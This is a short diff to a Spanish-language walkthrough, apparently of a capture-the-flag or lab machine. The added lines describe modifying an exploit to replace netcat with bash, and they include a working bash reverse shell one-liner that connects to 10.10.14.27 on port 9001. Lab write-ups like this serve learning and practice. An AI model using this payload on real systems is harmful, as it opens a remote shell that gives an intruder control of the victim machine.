@@ -327,4 +327,11 @@ decodeamos el base64 para darnos cuenta que se esta solicitando una petición co
 
 `Modificación del exploit`
 vamos a remplazar el `netcat` por un `bash -c` 
+
+reverse shell en bash
+```python
+bash -c "bash -i >& /dev/tcp/10.10.14.27/9001 0>&1"
+```
+
+
 ![[Pasted image 20240823154544.png]]
